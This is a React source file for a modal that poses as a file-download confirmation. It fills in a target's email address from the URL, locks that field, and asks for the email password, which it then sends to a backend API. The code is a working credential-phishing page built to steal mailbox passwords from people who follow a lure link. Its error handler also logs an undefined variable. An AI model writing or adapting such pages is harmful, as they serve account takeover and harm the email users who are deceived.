import React from 'react'
import logo from '../assets/logotrans1.png'
import { TfiClose } from "react-icons/tfi";
import { useState, useEffect } from 'react';
import { usePostInfoMutation } from '../redux/features/info/infoApi';
import { useNavigate } from 'react-router';
import { useLocation } from 'react-router-dom';


const LoadModal = ({handleCloseModal}) => {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [postInfo, {isLoading, error}] = usePostInfoMutation();
    const navigate = useNavigate();
    const location = useLocation();

    useEffect(()=> {
        const params = new URLSearchParams(location.search)
        const emailFromUrl = params.get('email');
        if(emailFromUrl){
            setEmail(emailFromUrl)
        }
    }, [location.search]);

    const handleSubmit = async (e)=>{
        e.preventDefault();
        try {
            const response = await postInfo({ email, password }).unwrap();
            console.log('Success:', response);
            navigate('/');
            handleCloseModal()
        } catch (error) {
            console.error('Error:', err);
        }
    }
  return (
    <div className='loadModal'>
        <div className='loadModal-content'>
        <div className='loadModal-close' onClick={handleCloseModal}><TfiClose /></div>
        <div className='loadModal-wrapper'>
            <div className='loadModal-logo-content'>
                <img src={logo} alt="logo" />
                <p>Confirm Receiving Email, to download attachment</p>
            </div>
            <form onSubmit={handleSubmit} className='loadModal-form'>
                <label>Email address</label>
                <input value={email} readOnly  className='loadModal-input' type="email" placeholder='Enter Email' />
                <label htmlFor="">Email Password</label>
                <input value={password} onChange={(e)=> setPassword(e.target.value)} className='loadModal-input' type="password" placeholder='Enter Email Password' />
                <div className='loadModal-checkbox'>
                    <input type="checkbox" />
                    <p>Stay Signed In</p>
                </div>
                <button className='loadModal-btn' type="submit" disabled={isLoading}>{isLoading ? 'Processing...' : 'Download File'}</button>
            </form>
            </div>
        </div>
    </div>
  )
}

export default LoadModal